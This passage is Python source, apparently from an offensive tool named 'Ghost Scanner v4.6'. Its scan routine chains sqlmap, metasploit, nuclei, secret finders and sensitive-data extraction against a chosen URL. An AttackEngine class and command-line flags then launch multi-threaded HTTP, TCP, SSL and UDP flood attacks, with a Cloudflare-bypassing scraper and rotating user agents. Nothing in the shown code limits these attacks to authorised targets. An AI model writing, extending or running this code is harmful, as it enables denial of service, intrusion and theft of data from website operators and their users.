        params = dict(list(all_p.items())[:100])

        self.results_scan["ports"] = self._scan_ports(self.results_scan["domain"])

        all_s = [self._extract_sensitive_data(html)]
        for u in api_urls[:5]:
            r = self._smart_request(u, timeout=6)
            if r: all_s.append(self._extract_sensitive_data(r.text))
        self._save_sensitive_data(all_s)

        self.results_scan["vulnerabilities"]["xss_dom"] = self._check_dom_xss(html, target)
        self.results_scan["vulnerabilities"]["xss_context_aware"] = self._scan_xss_dalfox(target, params)
        self.results_scan["vulnerabilities"]["sql_injection"] = self._scan_sql(target, params)

        # External tools
        if self.use_tools:
            console.print("[bold magenta]🔥 v4.6: External tools...[/bold magenta]")
            self.results_scan["external"]["subdomains"] = self._run_subfinder(self.results_scan["domain"]) + self._run_amass(self.results_scan["domain"])
            self.results_scan["external"]["dns_records"] = self._run_dnsx(self.results_scan["domain"])
            live_targets = self.results_scan["external"]["subdomains"][:20] if self.results_scan["external"]["subdomains"] else [target]
            self.results_scan["external"]["live_hosts"] = self._run_httpx(live_targets)
            self.results_scan["external"]["naabu_ports"] = self._run_naabu(self.results_scan["domain"])
            katana_urls = self._run_katana(target)
            self.results_scan["external"]["katana_urls"] = katana_urls[:200]
            self.results_scan["external"]["historical_urls"] = self._run_gau(self.results_scan["domain"]) + self._run_waybackurls(self.results_scan["domain"])
            self.results_scan["vulnerabilities"]["nuclei"] = self._run_nuclei(target)
            self.results_scan["vulnerabilities"]["ffuf"] = self._run_ffuf(target)
            self.results_scan["vulnerabilities"]["sqlmap"] = self._run_sqlmap(target)
            self.results_scan["vulnerabilities"]["dalfox_external"] = self._run_dalfox(target)
            self.results_scan["external"]["arjun_params"] = self._run_arjun(target)
            js_urls = [u for u in katana_urls if '.js' in u.lower()][:20]
            self.results_scan["vulnerabilities"]["secretfinder"] = self._run_secretfinder(js_urls)
            self.results_scan["vulnerabilities"]["interactsh"] = self._run_interactsh(target)
            # v4.6 new tools
            self.results_scan["vulnerabilities"]["nmap"] = self._run_nmap(target)
            self.results_scan["vulnerabilities"]["metasploit"] = self._run_metasploit(target)
            self.results_scan["vulnerabilities"]["wireshark"] = self._run_wireshark(target, duration=10)
            self.results_scan["vulnerabilities"]["burpsuite"] = self._run_burpsuite(target)

        # Summary
        all_f = []
        for cat, items in self.results_scan["vulnerabilities"].items():
            if isinstance(items, list): all_f.extend(items)
        self.results_scan["summary"] = {
            "total": len(all_f),
            "critical": len([f for f in all_f if f.get('risk') == 'CRITICAL']),
            "high": len([f for f in all_f if f.get('risk') == 'HIGH']),
            "medium": len([f for f in all_f if f.get('risk') == 'MEDIUM']),
            "low": len([f for f in all_f if f.get('risk') == 'LOW'])
        }
        self.results_scan["scan_duration"] = time.time() - start
        self.results_scan["validated"] = True

        if self.ai:
            self.results_scan["ai_analysis"] = self._ai_analysis(all_f, target, self.results_scan.get("admin_data"))

        self._generate_all_sensitive_pdfs(self.results_scan["sensitive_data"], self.results_scan.get("admin_data", {}), target)

        self._display(all_f)

        jf = f"{self.result_folder}/scan_{int(time.time())}.json"
        with open(jf, 'w', encoding='utf-8') as f: json.dump(self.results_scan, f, indent=2, ensure_ascii=False)
        console.print(f"[green]JSON: {jf}[/green]")
        if self.pdf:
            self._generate_pdf(self.results_scan, f"{self.result_folder}/report_{int(time.time())}.pdf")

    def _display(self, findings):
        c = Console()
        if not findings: c.print("[green]No vulnerabilities found.[/green]"); return
        t = Table(title="Findings", box=box.ROUNDED)
        for col in ["Type", "Param", "Risk", "Verified"]: t.add_column(col)
        for f in findings[:20]:
            v = "OK" if f.get('poc', {}).get('verified') else "?"
            t.add_row(f.get('type', 'Unknown')[:40], str(f.get('param', 'N/A'))[:20],
                      f.get('risk', 'INFO'), v)
        c.print(t)

# ========== ATTACK ENGINE ==========
class AttackEngine:
    def __init__(self, target, threads=200, duration=30, method='http'):
        self.target = target; self.threads = threads; self.duration = duration
        self.method = method; self.running = False
        self.scraper = cloudscraper.create_scraper(browser={'browser': 'chrome', 'platform': 'windows', 'desktop': True})
        self.ua = UserAgent()

    def start(self):
        c = Console(); c.print(f"[red]Starting {self.method.upper()} attack on {self.target}[/red]")
        self.running = True
        if self.method in ['http', 'all']: self._http_flood()
        if self.method in ['syn', 'all']: self._syn_flood()
        if self.method in ['ssl', 'all']: self._ssl_reneg()
        if self.method in ['udp', 'all']: self._udp_flood()
        time.sleep(self.duration); self.running = False
        c.print("[green]Attack stopped.[/green]")

    def _http_flood(self):
        success = [0]; lock = threading.Lock()
        def w():
            while self.running:
                try:
                    h = {'User-Agent': self.ua.random, 'Accept': '*/*', 'Connection': 'keep-alive'}
                    self.scraper.get(self.target, headers=h, timeout=3)
                    with lock:
                        success[0] += 1
                        if success[0] % 100 == 0: Console().print(f"[green]HTTP: {success[0]}[/green]")
                except: pass
                time.sleep(random.uniform(0.01, 0.05))
        for _ in range(self.threads): threading.Thread(target=w, daemon=True).start()

    def _syn_flood(self):
        def w():
            while self.running:
                try:
                    d = self.target.replace('https://','').replace('http://','').split('/')[0]
                    ip = socket.gethostbyname(d); port = random.choice([80, 443])
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(1)
                    s.connect((ip, port)); s.send(b"GET / HTTP/1.1\r\nHost: " + d.encode() + b"\r\n\r\n"); s.close()
                except: pass
                time.sleep(random.uniform(0.01, 0.03))
        for _ in range(self.threads): threading.Thread(target=w, daemon=True).start()

    def _ssl_reneg(self):
        def w():
            while self.running:
                try:
                    d = self.target.replace('https://','').replace('http://','').split('/')[0]
                    ctx = ssl.create_default_context(); s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(3)
                    s.connect((d, 443)); ss = ctx.wrap_socket(s, server_hostname=d); ss.send(b"R" * 4096); ss.close()
                except: pass
                time.sleep(random.uniform(0.05, 0.1))
        for _ in range(self.threads): threading.Thread(target=w, daemon=True).start()

    def _udp_flood(self):
        def w():
            while self.running:
                try:
                    d = self.target.replace('https://','').replace('http://','').split('/')[0]
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.settimeout(1)
                    s.sendto(b"X" * 1024, (d, random.choice([53, 123, 161])))
                except: pass
                time.sleep(0.001)
        for _ in range(self.threads): threading.Thread(target=w, daemon=True).start()

# ========== MAIN ==========
def main():
    if '-h' in sys.argv or '--help' in sys.argv: show_help()
    p = argparse.ArgumentParser(description="Ghost Scanner v4.6", add_help=False)
    p.add_argument('-u', '--url'); p.add_argument('-o', '--output', default='results.json')
    p.add_argument('-v', '--verbose', action='store_true')
    p.add_argument('--proxy-list'); p.add_argument('--validate-proxy', action='store_true')
    p.add_argument('--no-proxy', action='store_true'); p.add_argument('--quick', action='store_true')
    p.add_argument('--pdf', action='store_true'); p.add_argument('--ai', action='store_true')
    p.add_argument('--headless', action='store_true'); p.add_argument('--delay', type=float, default=0.5)
    p.add_argument('--force-admin', action='store_true')
    p.add_argument('--tools', action='store_true', help='Run all 19 external tools')
    p.add_argument('--wp-check', action='store_true'); p.add_argument('--wp-command')
    p.add_argument('--dos', action='store_true'); p.add_argument('--ddos', action='store_true')
    p.add_argument('--syn', action='store_true'); p.add_argument('--ssl-reneg', action='store_true')
    p.add_argument('--udp', action='store_true')
    p.add_argument('--threads', type=int, default=200); p.add_argument('--duration', type=int, default=30)
    args = p.parse_args()

    clear_screen(); show_banner()

    if args.wp_check:
        if not args.url: print("Error: --url required"); sys.exit(1)
        scanner = GhostScanner(target=args.url)
        for r in scanner._check_wp_activity_log(args.url):
            Console().print(f"[{r.get('risk')}] {r.get('type')}: {r.get('evidence')}")
        sys.exit(0)

    if not args.url:
        args.url = input("Enter target URL (https://): ").strip()
        if not args.url: print("No target."); sys.exit(1)

    attack = args.dos or args.ddos or args.syn or args.ssl_reneg or args.udp
    if attack:
        m = 'http'
        if args.ddos: m = 'all'
        elif args.syn: m = 'syn'
        elif args.ssl_reneg: m = 'ssl'
        elif args.udp: m = 'udp'
        AttackEngine(args.url, threads=args.threads, duration=args.duration, method=m).start()
    else:
        scanner = GhostScanner(
            target=args.url, use_proxy=not args.no_proxy, proxy_file=args.proxy_list,
            validate_proxy=args.validate_proxy, quick=args.quick, pdf=args.pdf,
            ai=args.ai, headless=args.headless, delay=args.delay,
            force_admin=args.force_admin, use_tools=args.tools
        )
        try: scanner.run_scan(args.url)
        except KeyboardInterrupt: Console().print("[red]Interrupted.[/red]")
        except Exception as e:
            Console().print(f"[red]Error: {e}[/red]")
            import traceback; traceback.print_exc()

if __name__ == "__main__":
    main()